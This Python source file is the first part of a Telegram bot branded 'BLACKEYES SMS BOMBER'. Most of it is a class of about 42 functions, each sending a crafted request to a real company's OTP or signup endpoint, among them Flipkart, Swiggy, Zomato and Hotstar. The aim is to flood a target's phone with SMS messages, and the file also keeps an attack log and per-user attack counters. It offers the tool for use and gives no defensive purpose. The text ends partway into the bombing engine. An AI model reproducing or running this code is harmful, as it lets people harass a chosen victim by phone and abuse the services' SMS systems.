#!/usr/bin/env python3
# ==============================================
# 🐉 BLACKEYES SMS BOMBER - TELEGRAM BOT
# Complete Telegram Bot Version
# ==============================================
# Developer: BLACKEYES🐉
# Version: 5.0 TELEGRAM BOT
# ==============================================

import os
import sys
import time
import random
import threading
import json
import base64
import datetime
import logging
import asyncio
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs

# ==============================================
# 📦 DEPENDENCY CHECK
# ==============================================
try:
    import requests
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
except ImportError:
    os.system("pip install python-telegram-bot requests")
    import requests
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ==============================================
# ⚙️ CONFIGURATION - CHANGE THESE
# ==============================================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # <-- Apna bot token yahan daalein
ADMIN_IDS = [123456789, 987654321]  # <-- Apne admin IDs yahan daalein
ALLOWED_GROUPS = []  # Empty = all groups allowed, ya specific group IDs daalein

# ==============================================
# 📁 FILES
# ==============================================
PROTECTED_FILE = "blackeyes_protected.json"
CONFIG_FILE = "blackeyes_config.json"
ATTACK_LOG = "blackeyes_attacks.log"
BOT_DATA_FILE = "bot_data.json"

# ==============================================
# ⚙️ DEFAULT CONFIG
# ==============================================
DEFAULT_CONFIG = {
    "country_code": "91",
    "delay": 0.3,
    "threads": 15,
    "max_requests": 1000,
    "auto_retry": True,
    "theme": "BLACKEYES",
    "sound": True,
    "animation": True,
    "mode": "balanced"
}

# ==============================================
# 📝 LOGGING
# ==============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==============================================
# 💥 ALL 45+ WORKING APIS - MERGED FROM ALL FILES
# ==============================================

class APIManager:
    """All APIs merged from all 5 files"""
    
    @staticmethod
    def send_oyo(phone, cc):
        """OYO Rooms"""
        try:
            url = f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B{cc}&nod=4&phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_flipkart(phone, cc):
        """Flipkart"""
        try:
            url = "https://www.flipkart.com/api/6/user/signup/status"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"loginId": [f"+{cc}{phone}"], "supportAllStates": True}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pharmeasy(phone, cc):
        """PharmEasy"""
        try:
            url = "https://pharmeasy.in/api/auth/requestOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactNumber": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_practo(phone, cc):
        """Practo"""
        try:
            url = "https://accounts.practo.com/send_otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'client_name': 'Practo Android App', 'mobile': f'+{cc}{phone}'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "success" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_goibibo(phone, cc):
        """GoIbibo"""
        try:
            url = "https://www.goibibo.com/common/downloadsms/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mbl': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pizzahut(phone, cc):
        """PizzaHut"""
        try:
            url = "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"customer": {"MobileNo": phone, "UserName": phone, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_altbalaji(phone, cc):
        """AltBalaji"""
        try:
            url = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_code": cc, "phone_number": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_ajio(phone, cc):
        """Ajio"""
        try:
            url = "https://www.ajio.com/api/auth/signupSendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"firstName": "User", "login": "user@gmail.com", "password": "Pass@123", "mobileNumber": phone, "requestType": "SENDOTP"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return '"statusCode":"1"' in r.text or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_lenskart(phone, cc):
        """Lenskart"""
        try:
            url = "https://www.ref-r.com/clients/lenskart/smsApi"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone, 'submit': '1'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_apollo(phone, cc):
        """Apollo Pharmacy"""
        try:
            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "sent" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_grab(phone, cc):
        """Grab"""
        try:
            url = "https://api.grab.com/grabid/v1/phone/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{phone}', 'templateID': 'pax_android_production'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_gokwik(phone, cc):
        """GoKwik"""
        try:
            url = "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'gk-merchant-id': '19g6im8srkz9y'}
            data = {"phone": phone, "country": "IN"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_khatabook(phone, cc):
        """Khatabook"""
        try:
            url = "https://api.khatabook.com/v1/auth/request-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'x-kb-platform': 'web'}
            data = {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_udaan(phone, cc):
        """Udaan"""
        try:
            url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_penpencil(phone, cc):
        """PenPencil"""
        try:
            url = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_vidyakul(phone, cc):
        """Vidyakul"""
        try:
            url = "https://vidyakul.com/signup-otp/send"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'phone': phone, 'rcsconsent': 'true'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_jockey(phone, cc):
        """Jockey"""
        try:
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{phone}?whatsapp=true"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pinknblu(phone, cc):
        """Pinknblu"""
        try:
            url = "https://pinknblu.com/v1/auth/generate/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 'country_code': f'+{cc}', 'phone': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_breeze(phone, cc):
        """Breeze"""
        try:
            url = "https://api.breeze.in/session/start"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phoneNumber": phone, "authVerificationType": "otp", "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_heromoto(phone, cc):
        """Hero MotoCorp"""
        try:
            url = "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile_no': phone, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis='}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_indialends(phone, cc):
        """IndiaLends"""
        try:
            url = "https://indialends.com/internal/a/mobile-verification_v2.ashx"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': phone, 'lj80gertdfg': '0'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_delhivery(phone, cc):
        """Delhivery"""
        try:
            url = f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_confirmtkt(phone, cc):
        """ConfirmTkt"""
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_nuvama(phone, cc):
        """Nuvama Wealth"""
        try:
            url = "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactInfo": phone, "mode": "SMS"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_aditya(phone, cc):
        """Aditya Birla"""
        try:
            url = "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_kisan(phone, cc):
        """Kisan"""
        try:
            url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile_number": phone, "client_id": "kisan-app"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_swiggy(phone, cc):
        """Swiggy"""
        try:
            url = "https://www.swiggy.com/mapi/auth/signup"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"name": "User", "email": "user@gmail.com", "password": "Pass@123", "mobile": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_zomato(phone, cc):
        """Zomato"""
        try:
            url = "https://www.zomato.com/webroutes/auth/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bigbasket(phone, cc):
        """BigBasket"""
        try:
            url = "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"identifier": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bookmyshow(phone, cc):
        """BookMyShow"""
        try:
            url = "https://in.bookmyshow.com/pwa/api/uapi/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_dream11(phone, cc):
        """Dream11"""
        try:
            url = "https://www.dream11.com/graphql/mutation/pwa/register"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"query": "mutation register($email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation(email: $email mobileNumber: $mobileNumber password: $password site: $site) { message }}", "variables": {"email": "user@gmail.com", "mobileNumber": phone, "password": "Pass@123"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sonyliv(phone, cc):
        """SonyLiv"""
        try:
            url = "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobileNumber": phone, "channelPartnerID": "MSMIND", "country": "IN", "timestamp": datetime.datetime.now().isoformat()}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_hotstar(phone, cc):
        """Hotstar"""
        try:
            url = "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phone_number": phone, "country_prefix": cc}
            r = requests.put(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_voot(phone, cc):
        """Voot"""
        try:
            url = "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"type": "mobile", "mobile": phone, "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bikroy(phone, cc):
        """Bikroy"""
        try:
            url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'application-name': 'web'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_garibook(phone, cc):
        """Garibook"""
        try:
            url = "https://api.garibookadmin.com/api/v3/user/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "recaptcha_token": "garibookcaptcha", "channel": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sheba(phone, cc):
        """Sheba"""
        try:
            url = "https://accountkit.sheba.xyz/api/shooot-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "app_id": "8329815A6D1AE6DD"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_applink(phone, cc):
        """AppLink"""
        try:
            url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"msisdn": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_arogga(phone, cc):
        """Arogga"""
        try:
            url = "https://api.arogga.com/auth/v1/sms/send/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone, 'fcmToken': '', 'referral': ''}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_osudpotro(phone, cc):
        """Osudpotro"""
        try:
            url = "https://api.osudpotro.com/api/v1/users/send_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "deviceToken": "web", "language": "en", "os": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_medeasy(phone, cc):
        """MedEasy"""
        try:
            url = f"https://api.medeasy.health/api/send-otp/+{cc}{phone}/"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_carebox(phone, cc):
        """Care Box"""
        try:
            url = "https://www.api-care-box.click/api/user/register/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"Name": "User", "Phone": f"+{cc}{phone}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False

# ==============================================
# 📋 COMPLETE API LIST - ALL MERGED
# ==============================================
ALL_APIS = [
    {"name": "OYO Rooms", "func": APIManager.send_oyo},
    {"name": "Flipkart", "func": APIManager.send_flipkart},
    {"name": "PharmEasy", "func": APIManager.send_pharmeasy},
    {"name": "Practo", "func": APIManager.send_practo},
    {"name": "GoIbibo", "func": APIManager.send_goibibo},
    {"name": "PizzaHut", "func": APIManager.send_pizzahut},
    {"name": "AltBalaji", "func": APIManager.send_altbalaji},
    {"name": "Ajio", "func": APIManager.send_ajio},
    {"name": "Lenskart", "func": APIManager.send_lenskart},
    {"name": "Apollo", "func": APIManager.send_apollo},
    {"name": "Grab", "func": APIManager.send_grab},
    {"name": "GoKwik", "func": APIManager.send_gokwik},
    {"name": "Khatabook", "func": APIManager.send_khatabook},
    {"name": "Udaan", "func": APIManager.send_udaan},
    {"name": "PenPencil", "func": APIManager.send_penpencil},
    {"name": "Vidyakul", "func": APIManager.send_vidyakul},
    {"name": "Jockey", "func": APIManager.send_jockey},
    {"name": "Pinknblu", "func": APIManager.send_pinknblu},
    {"name": "Breeze", "func": APIManager.send_breeze},
    {"name": "HeroMoto", "func": APIManager.send_heromoto},
    {"name": "IndiaLends", "func": APIManager.send_indialends},
    {"name": "Delhivery", "func": APIManager.send_delhivery},
    {"name": "ConfirmTkt", "func": APIManager.send_confirmtkt},
    {"name": "Nuvama", "func": APIManager.send_nuvama},
    {"name": "AdityaBirla", "func": APIManager.send_aditya},
    {"name": "Kisan", "func": APIManager.send_kisan},
    {"name": "Swiggy", "func": APIManager.send_swiggy},
    {"name": "Zomato", "func": APIManager.send_zomato},
    {"name": "BigBasket", "func": APIManager.send_bigbasket},
    {"name": "BookMyShow", "func": APIManager.send_bookmyshow},
    {"name": "Dream11", "func": APIManager.send_dream11},
    {"name": "SonyLiv", "func": APIManager.send_sonyliv},
    {"name": "Hotstar", "func": APIManager.send_hotstar},
    {"name": "Voot", "func": APIManager.send_voot},
    {"name": "Bikroy", "func": APIManager.send_bikroy},
    {"name": "Garibook", "func": APIManager.send_garibook},
    {"name": "Sheba", "func": APIManager.send_sheba},
    {"name": "AppLink", "func": APIManager.send_applink},
    {"name": "Arogga", "func": APIManager.send_arogga},
    {"name": "Osudpotro", "func": APIManager.send_osudpotro},
    {"name": "MedEasy", "func": APIManager.send_medeasy},
    {"name": "CareBox", "func": APIManager.send_carebox},
]

# ==============================================
# 💾 DATA MANAGEMENT
# ==============================================
def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return {}
    try:
        with open(PROTECTED_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_protected(data):
    with open(PROTECTED_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def log_attack(phone, count, success, user_id=None):
    try:
        with open(ATTACK_LOG, "a") as f:
            f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {count} | {success} | User: {user_id}\n")
    except:
        pass

def encrypt_number(phone):
    return base64.b64encode(phone.encode()).decode()

def is_protected(phone):
    data = load_protected()
    return phone in data

def protect_number(phone, name="Protected"):
    data = load_protected()
    data[phone] = {
        "phone": phone,
        "name": name,
        "encrypted": encrypt_number(phone),
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_protected(data)
    return True

def remove_protected(phone):
    data = load_protected()
    if phone in data:
        del data[phone]
        save_protected(data)
        return True
    return False

# ==============================================
# 📊 USER DATA MANAGEMENT
# ==============================================
def load_bot_data():
    if not os.path.exists(BOT_DATA_FILE):
        return {"users": {}, "total_attacks": 0}
    try:
        with open(BOT_DATA_FILE, "r") as f:
            return json.load(f)
    except:
        return {"users": {}, "total_attacks": 0}

def save_bot_data(data):
    with open(BOT_DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def add_user(user_id, username=None):
    data = load_bot_data()
    if str(user_id) not in data["users"]:
        data["users"][str(user_id)] = {
            "username": username,
            "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "attacks": 0
        }
        save_bot_data(data)
    return True

def update_user_attack(user_id):
    data = load_bot_data()
    if str(user_id) in data["users"]:
        data["users"][str(user_id)]["attacks"] = data["users"][str(user_id)].get("attacks", 0) + 1
        data["total_attacks"] = data.get("total_attacks", 0) + 1
        save_bot_data(data)
    return True

# ==============================================
# 💥 BOMBING ENGINE - TELEGRAM VERSION
# ==============================================
class BombingEngine:
    def __init__(self):
       
